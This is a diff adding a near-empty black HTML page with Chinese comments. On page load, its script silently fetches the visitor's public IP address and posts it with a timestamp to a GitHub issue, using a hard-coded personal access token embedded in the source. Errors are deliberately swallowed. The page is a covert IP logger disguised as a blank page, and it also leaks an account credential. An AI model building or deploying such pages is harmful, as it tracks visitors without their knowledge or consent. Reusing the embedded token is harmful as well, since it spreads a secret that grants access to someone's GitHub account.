@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>body{background:#000;}</style>
+</head>
+<body>
+<script>
+// 极简版本
+const TOKEN = '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';
+const 用户 = 'amiyaccc';
+const 仓库 = 'api';
+const 议题号 = 1;
+
+(async () => {
+    try {
+        // 获取IP
+        const res = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await res.json();
+        
+        // 记录到GitHub
+        await fetch(`https://api.github.com/repos/${用户}/${仓库}/issues/${议题号}/comments`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `token ${TOKEN}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                body: `IP: ${ip}\n时间: ${new Date().toLocaleString('zh-CN')}`
+            })
+        });
+    } catch(e) {
+        console.log('记录失败（静默失败）');
+    }
+})();
+</script>
+</body>
+</html>
